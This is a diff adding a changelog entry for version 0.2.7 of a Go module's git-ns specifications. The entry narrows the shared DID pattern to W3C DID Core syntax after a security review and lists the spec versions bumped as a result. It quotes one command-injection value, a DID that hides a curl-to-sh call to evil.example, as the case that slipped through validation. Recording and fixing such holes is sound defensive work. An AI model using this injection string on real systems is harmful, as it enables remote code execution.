@@ -11,6 +11,57 @@ A Go module is published by tagging, so the released version of this module is
 the `trust-tasks-go/vX.Y.Z` tag rather than anything in the tree; the `Version`
 constant in `trusttasks/version.go` mirrors it. See `RELEASING.md`.
 
+## 0.2.7 — 2026-09-24
+
+
+### Added
+
+- **git-ns**: Hold every DID to the W3C DID Core syntax (#629)
+
+The family's shared `Did` pattern, `^did:[a-z0-9]+:\S+$`, accepted
+  anything without whitespace after the method: shell metacharacters,
+  quotes, backticks, `/`, `?` and `#`. A security review found that
+  `did:web:x.example$(curl${IFS}-s${IFS}evil.example|sh)` validated as a
+  right's subject and later reached a copyable shell command in an admin
+  UI.
+
+  git-ns/_shared 0.3 narrows `Did` to a bare DID per DID Core 3.1:
+  `did:`, a lowercase method name, and a method-specific id of
+  colon-separated segments of `A-Z a-z 0-9 . - _` and percent-encoded
+  octets, the last one non-empty. No path, query or fragment: every
+  member typed `Did` names a party (subjects, owners, grantedBy, a
+  transfer's `to`, a job's subjects), never a verification method. No
+  other definition changes, and no DID-URL field in the family uses
+  `Did`. The framework defines no DID pattern to reuse; issuer and
+  recipient are unconstrained VIDs.
+
+  Versioning. SPEC 6.6 item 1 requires a narrowed constraint in a shared
+  schema component to be a new component version, so _shared/0.1 and
+  0.2 are untouched. Item 3 couples adoption to a new version of each
+  consuming specification, and the in-place rule of 5.2 covers only
+  re-pins with no wire effect, so each latest spec version that carries
+  a `Did` gets a new version. They are all draft, so the breaking
+  narrowing ships as a MINOR increment under the draft allowance of 5.2:
+
+    view 0.3, bridge/job 0.3, drift/resolve 0.2, namespace/reseat 0.2,
+    repo/adopt 0.2, repo/archive 0.2, repo/create 0.2,
+    repo/transfer 0.2, right/grant 0.2, right/revoke 0.2
+
+  Each restates its predecessor with a "Changes from" section, pins
+  _shared/0.3, and links to the newest versions of its siblings. The
+  specs that carry no `Did` (account/*, bridge/event, bridge/result,
+  namespace/bind, namespace/unbind) are unchanged.
+
+  The six specs with a `Did` in the request gain invalid examples: shell
+  metacharacters, whitespace, a `#` fragment and an uppercase method
+  (and, for bridge/job, a bad `desiredRoles[].subject`).
+
+  Bindings regenerated for Rust, TypeScript, Go and Dart. In TypeScript
+  the hoisted `SharedComponents.Did`, `RepoSummary` and `RightRecord` now
+  exist in two shapes and take family/version-qualified names
+  (`Did_GitNsV0_1`, `Did_GitNsV0_3`, ...), as in #508; each spec module
+  still exports them under their own names.
+
 ## 0.2.6 — 2026-09-24
 
 
